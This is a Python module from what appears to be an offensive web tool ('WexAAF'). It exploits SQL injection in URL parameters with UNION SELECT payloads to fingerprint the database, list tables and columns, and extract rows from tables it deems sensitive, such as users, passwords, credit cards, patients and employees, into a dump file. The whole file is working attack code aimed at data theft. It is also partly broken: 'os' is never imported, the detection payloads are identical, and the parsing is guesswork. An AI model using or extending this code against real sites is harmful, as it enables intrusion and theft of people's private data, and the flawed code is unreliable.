"""
Data Dumper Module for WexAAF
Handles database enumeration and data extraction
"""

import re
import json
from .utils import Colors


class DataDumper:
    """
    Data Dumper class for database enumeration
    """
    
    # Common database queries
    DATABASE_QUERIES = {
        'MySQL': {
            'version': 'SELECT version()',
            'database': 'SELECT database()',
            'user': 'SELECT user()',
            'tables': 'SELECT table_name FROM information_schema.tables WHERE table_schema=database()',
            'columns': 'SELECT column_name FROM information_schema.columns WHERE table_name="{table}"',
            'data': 'SELECT * FROM {table} LIMIT 10'
        },
        'PostgreSQL': {
            'version': 'SELECT version()',
            'database': 'SELECT current_database()',
            'user': 'SELECT current_user',
            'tables': 'SELECT table_name FROM information_schema.tables WHERE table_schema=current_schema()',
            'columns': 'SELECT column_name FROM information_schema.columns WHERE table_name=\'{table}\'',
            'data': 'SELECT * FROM {table} LIMIT 10'
        },
        'SQL Server': {
            'version': 'SELECT @@version',
            'database': 'SELECT db_name()',
            'user': 'SELECT user_name()',
            'tables': 'SELECT table_name FROM information_schema.tables',
            'columns': 'SELECT column_name FROM information_schema.columns WHERE table_name=\'{table}\'',
            'data': 'SELECT TOP 10 * FROM {table}'
        },
        'Oracle': {
            'version': 'SELECT banner FROM v$version WHERE rownum=1',
            'database': 'SELECT global_name FROM global_name',
            'user': 'SELECT user FROM dual',
            'tables': 'SELECT table_name FROM all_tables WHERE rownum<=10',
            'columns': 'SELECT column_name FROM all_tab_columns WHERE table_name=\'{table}\'',
            'data': 'SELECT * FROM {table} WHERE ROWNUM<=10'
        },
        'SQLite': {
            'version': 'SELECT sqlite_version()',
            'database': '\'sqlite\'',
            'user': '\'sqlite\'',
            'tables': 'SELECT name FROM sqlite_master WHERE type=\'table\'',
            'columns': 'SELECT sql FROM sqlite_master WHERE name=\'{table}\'',
            'data': 'SELECT * FROM {table} LIMIT 10'
        }
    }
    
    # Common sensitive table names
    SENSITIVE_TABLES = [
        'users', 'user', 'admin', 'administrator', 'accounts', 'account',
        'login', 'logins', 'members', 'member', 'customers', 'customer',
        'password', 'passwords', 'credentials', 'secrets', 'keys',
        'credit_cards', 'cards', 'payments', 'transaction', 'transactions',
        'personal_data', 'profile', 'profiles', 'contact',
        'orders', 'order_history', 'cart', 'shopping_cart',
        'config', 'configuration', 'settings', 'preferences',
        'employees', 'staff', 'personnel',
        'students', 'patients', 'clients'
    ]
    
    def __init__(self, http_handler):
        """
        Initialize Data Dumper
        
        Args:
            http_handler: HTTPHandler instance
        """
        self.http_handler = http_handler
        self.database_type = 'Unknown'
        self.extracted_data = {
            'database_info': {},
            'tables': [],
            'columns': {},
            'data': {}
        }
    
    def enumerate_database(self, vulnerable_params, column_count=None):
        """
        Enumerate database structure and content
        
        Args:
            vulnerable_params (list): List of vulnerable parameters
            column_count (int): Number of columns (for injection)
        
        Returns:
            dict: Database enumeration results
        """
        print(f"{Colors.CYAN}[i] Starting database enumeration...{Colors.RESET}")
        
        if not vulnerable_params:
            return {
                'success': False,
                'message': 'No vulnerable parameters available',
                'data': self.extracted_data
            }
        
        # Detect database type
        print(f"{Colors.CYAN}[i] Detecting database type...{Colors.RESET}")
        db_type = self._detect_database_type(vulnerable_params[0])
        
        if db_type == 'Unknown':
            print(f"{Colors.YELLOW}[!] Could not detect database type{Colors.RESET}")
            # Try MySQL as default
            db_type = 'MySQL'
        
        self.database_type = db_type
        print(f"{Colors.GREEN}[✓] Database type: {db_type}{Colors.RESET}")
        
        # Get basic database info
        print(f"{Colors.CYAN}[i] Extracting database information...{Colors.RESET}")
        db_info = self._extract_database_info(vulnerable_params[0], db_type)
        self.extracted_data['database_info'] = db_info
        
        # Enumerate tables
        print(f"{Colors.CYAN}[i] Enumerating tables...{Colors.RESET}")
        tables = self._enumerate_tables(vulnerable_params[0], db_type, column_count)
        self.extracted_data['tables'] = tables
        
        # Enumerate columns for each sensitive table
        sensitive_tables = [t for t in tables if any(s in t.lower() for s in self.SENSITIVE_TABLES)]
        
        if sensitive_tables:
            print(f"{Colors.YELLOW}[i] Found potentially sensitive tables: {', '.join(sensitive_tables[:5])}{Colors.RESET}")
            
            for table in sensitive_tables[:3]:  # Limit to 3 tables
                print(f"{Colors.CYAN}[i] Enumerating columns for table: {table}{Colors.RESET}")
                columns = self._enumerate_columns(vulnerable_params[0], db_type, table, column_count)
                self.extracted_data['columns'][table] = columns
                
                # Extract data from sensitive columns
                if columns:
                    print(f"{Colors.YELLOW}[i] Extracting data from table: {table}{Colors.RESET}")
                    data = self._extract_table_data(vulnerable_params[0], db_type, table, column_count)
                    self.extracted_data['data'][table] = data
        
        return {
            'success': True,
            'database_type': db_type,
            'data': self.extracted_data
        }
    
    def _detect_database_type(self, param):
        """
        Detect database type using error messages
        
        Args:
            param (str): Vulnerable parameter
        
        Returns:
            str: Database type
        """
        test_payloads = {
            'MySQL': "'",
            'PostgreSQL': "'",
            'SQL Server': "'",
            'Oracle': "'",
            'SQLite': "'"
        }
        
        for db_type, payload in test_payloads.items():
            url = self.http_handler.target_url
            
            if '?' in url:
                base_url, query_string = url.split('?', 1)
                params = query_string.split('&')
                modified_params = []
                
                for p in params:
                    if p.startswith(f'{param}='):
                        modified_params.append(f'{param}={payload}')
                    else:
                        modified_params.append(p)
                
                modified_url = f'{base_url}?{"&".join(modified_params)}'
            else:
                modified_url = f'{url}?{param}={payload}'
            
            response = self.http_handler.get(modified_url)
            
            if response['success']:
                content = response.get('content', '').lower()
                
                # Check for database-specific error messages
                if db_type == 'MySQL' and any(s in content for s in ['mysql', 'mysqli']):
                    return db_type
                elif db_type == 'PostgreSQL' and any(s in content for s in ['postgresql', 'pg_']):
                    return db_type
                elif db_type == 'SQL Server' and any(s in content for s in ['sql server', 'mssql']):
                    return db_type
                elif db_type == 'Oracle' and any(s in content for s in ['oracle', 'ora-']):
                    return db_type
                elif db_type == 'SQLite' and 'sqlite' in content:
                    return db_type
        
        return 'Unknown'
    
    def _extract_database_info(self, param, db_type):
        """
        Extract basic database information
        
        Args:
            param (str): Vulnerable parameter
            db_type (str): Database type
        
        Returns:
            dict: Database information
        """
        if db_type not in self.DATABASE_QUERIES:
            return {}
        
        queries = self.DATABASE_QUERIES[db_type]
        info = {}
        
        # Get version
        print(f"{Colors.CYAN}[i] Getting database version...{Colors.RESET}")
        version = self._execute_query(param, queries['version'])
        if version:
            info['version'] = self._clean_query_result(version)
            print(f"{Colors.GREEN}[✓] Version: {info['version'][:50]}{Colors.RESET}")
        
        # Get database name
        print(f"{Colors.CYAN}[i] Getting database name...{Colors.RESET}")
        database = self._execute_query(param, queries['database'])
        if database:
            info['database_name'] = self._clean_query_result(database)
            print(f"{Colors.GREEN}[✓] Database: {info['database_name']}{Colors.RESET}")
        
        # Get current user
        print(f"{Colors.CYAN}[i] Getting current user...{Colors.RESET}")
        user = self._execute_query(param, queries['user'])
        if user:
            info['current_user'] = self._clean_query_result(user)
            print(f"{Colors.GREEN}[✓] User: {info['current_user']}{Colors.RESET}")
        
        return info
    
    def _enumerate_tables(self, param, db_type, column_count=None):
        """
        Enumerate database tables
        
        Args:
            param (str): Vulnerable parameter
            db_type (str): Database type
            column_count (int): Number of columns
        
        Returns:
            list: Table names
        """
        if db_type not in self.DATABASE_QUERIES:
            return []
        
        query = self.DATABASE_QUERIES[db_type]['tables']
        result = self._execute_query(param, query, column_count)
        
        if not result:
            return []
        
        tables = self._extract_table_names_from_result(result)
        print(f"{Colors.GREEN}[✓] Found {len(tables)} table(s){Colors.RESET}")
        
        return tables
    
    def _enumerate_columns(self, param, db_type, table, column_count=None):
        """
        Enumerate columns for a specific table
        
        Args:
            param (str): Vulnerable parameter
            db_type (str): Database type
            table (str): Table name
            column_count (int): Number of columns
        
        Returns:
            list: Column names
        """
        if db_type not in self.DATABASE_QUERIES:
            return []
        
        query = self.DATABASE_QUERIES[db_type]['columns'].format(table=table)
        result = self._execute_query(param, query, column_count)
        
        if not result:
            return []
        
        columns = self._extract_column_names_from_result(result)
        print(f"{Colors.GREEN}[✓] Found {len(columns)} column(s){Colors.RESET}")
        
        return columns
    
    def _extract_table_data(self, param, db_type, table, column_count=None):
        """
        Extract data from a table
        
        Args:
            param (str): Vulnerable parameter
            db_type (str): Database type
            table (str): Table name
            column_count (int): Number of columns
        
        Returns:
            list: Table data
        """
        if db_type not in self.DATABASE_QUERIES:
            return []
        
        query = self.DATABASE_QUERIES[db_type]['data'].format(table=table)
        result = self._execute_query(param, query, column_count)
        
        if not result:
            return []
        
        data = self._parse_data_result(result)
        print(f"{Colors.YELLOW}[i] Extracted {len(data)} row(s) from {table}{Colors.RESET}")
        
        return data
    
    def _execute_query(self, param, query, column_count=None):
        """
        Execute SQL injection query
        
        Args:
            param (str): Vulnerable parameter
            query (str): SQL query to execute
            column_count (int): Number of columns
        
        Returns:
            str: Query result
        """
        url = self.http_handler.target_url
        
        # Build UNION SELECT payload
        if column_count:
            payload = f"1 UNION SELECT {self._build_union_select(query, column_count)}--"
        else:
            payload = f"1 UNION SELECT {query}--"
        
        # URL encode the payload
        import urllib.parse
        encoded_payload = urllib.parse.quote(payload)
        
        if '?' in url:
            base_url, query_string = url.split('?', 1)
            params = query_string.split('&')
            modified_params = []
            
            for p in params:
                if p.startswith(f'{param}='):
                    modified_params.append(f'{param}={encoded_payload}')
                else:
                    modified_params.append(p)
            
            modified_url = f'{base_url}?{"&".join(modified_params)}'
        else:
            modified_url = f'{url}?{param}={encoded_payload}'
        
        response = self.http_handler.get(modified_url)
        
        if response['success'] and response['status_code'] == 200:
            return response.get('content', '')
        
        return None
    
    def _build_union_select(self, query, column_count):
        """
        Build UNION SELECT statement with correct column count
        
        Args:
            query (str): Original query
            column_count (int): Number of columns
        
        Returns:
            str: Modified UNION SELECT
        """
        # This is a simplified version
        # In a real implementation, you would need to properly parse and structure the query
        # and figure out which columns to inject data into
        
        parts = query.split(',')
        select_parts = []
        
        for i in range(column_count):
            if i < len(parts):
                select_parts.append(parts[i].strip())
            else:
                select_parts.append(str(i + 1))
        
        return ','.join(select_parts)
    
    def _clean_query_result(self, result):
        """
        Clean query result to extract relevant data
        
        Args:
            result (str): Raw query result
        
        Returns:
            str: Cleaned result
        """
        if not result:
            return ''
        
        # Remove HTML tags
        import re
        clean_text = re.sub(r'<[^>]+>', ' ', result)
        
        # Extract database strings (common patterns)
        patterns = [
            r'(mysql\s*[\d.]+)',
            r'(postgresql\s*[\d.]+)',
            r'(microsoft\s*sql\s*server\s*[\d.]+)',
            r'(ora-[\d.]+)',
            r'([a-z0-9_]+\.?[a-z0-9_]+@[a-z0-9_-]+\.[a-z]{2,})',  # Email pattern
            r'([a-zA-Z0-9_-]{20,})',  # Potential password/token
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, clean_text, re.IGNORECASE)
            if matches:
                return matches[0]
        
        # Return first meaningful word
        words = clean_text.split()
        for word in words:
            if len(word) > 3 and word.isalnum():
                return word
        
        return clean_text[:100]  # Return first 100 chars
    
    def _extract_table_names_from_result(self, result):
        """
        Extract table names from query result
        
        Args:
            result (str): Query result
        
        Returns:
            list: Table names
        """
        import re
        
        # Common table name patterns
        # Look for words that could be table names
        words = re.findall(r'\b[a-z_]+\b', result, re.IGNORECASE)
        
        # Filter for likely table names
        tables = []
        for word in words:
            if len(word) >= 3 and word.islower() and '_' in word:
                tables.append(word)
        
        return list(set(tables[:20]))  # Return top 20 unique
    
    def _extract_column_names_from_result(self, result):
        """
        Extract column names from query result
        
        Args:
            result (str): Query result
        
        Returns:
            list: Column names
        """
        import re
        
        # Look for common column name patterns
        columns = []
        common_columns = ['id', 'name', 'email', 'username', 'password', 'created_at', 
                         'updated_at', 'user_id', 'status', 'value', 'description']
        
        for col in common_columns:
            if col in result.lower():
                columns.append(col)
        
        return list(set(columns))
    
    def _parse_data_result(self, result):
        """
        Parse data from query result
        
        Args:
            result (str): Query result
        
        Returns:
            list: Parsed data rows
        """
        import re
        
        data = []
        
        # Look for patterns that might be data rows
        # This is a simplified approach
        lines = result.split('\n')
        
        for line in lines:
            # Look for lines with multiple words (potential data)
            words = re.findall(r'\b[a-zA-Z0-9@._-]+\b', line)
            if len(words) >= 3:
                data.append(words)
        
        return data[:10]  # Return first 10 rows
    
    def save_dump(self, filename=None):
        """
        Save extracted data to file
        
        Args:
            filename (str): Output filename
        
        Returns:
            bool: Success status
        """
        import time
        
        if not filename:
            if not os.path.exists('output'):
                os.makedirs('output')
            filename = f"output/db_dump_{time.strftime('%Y%m%d_%H%M%S')}.json"
        
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(self.extracted_data, f, indent=2, default=str)
            
            print(f"{Colors.GREEN}[✓] Database dump saved to: {filename}{Colors.RESET}")
            return True
            
        except Exception as e:
            print(f"{Colors.RED}[✗] Error saving dump: {str(e)}{Colors.RESET}")
            return False
    
    def generate_report(self):
        """
        Generate a formatted report of extracted data
        
        Returns:
            str: Formatted report
        """
        report = f"""
{'='*70}
DATABASE ENUMERATION REPORT
{'='*70}

Database Type: {self.database_type}
{'-'*70}

DATABASE INFORMATION:
"""
        
        for key, value in self.extracted_data.get('database_info', {}).items():
            report += f"{key.replace('_', ' ').title()}: {value}\n"
        
        report += f"\n{'-'*70}\n"
        report += f"TABLES ({len(self.extracted_data.get('tables', []))}):\n"
        report += f"{'-'*70}\n"
        
        for table in self.extracted_data.get('tables', []):
            is_sensitive = any(s in table.lower() for s in self.SENSITIVE_TABLES)
            marker = f"{Colors.RED}[SENSITIVE]{Colors.RESET}" if is_sensitive else ""
            report += f"  - {table} {marker}\n"
        
        report += f"\n{'-'*70}\n"
        report += f"COLUMNS AND DATA:\n"
        report += f"{'-'*70}\n"
        
        for table, columns in self.extracted_data.get('columns', {}).items():
            report += f"\n{Colors.YELLOW}Table: {table}{Colors.RESET}\n"
            report += f"  Columns: {', '.join(columns)}\n"
            
            if table in self.extracted_data.get('data', {}):
                data = self.extracted_data['data'][table]
                report += f"  Sample Data ({len(data)} rows):\n"
                for row in data[:3]:  # Show first 3 rows
                    report += f"    {', '.join(str(x) for x in row[:5])}\n"  # Show first 5 columns
        
        report += f"\n{'='*70}\n"
        
        return report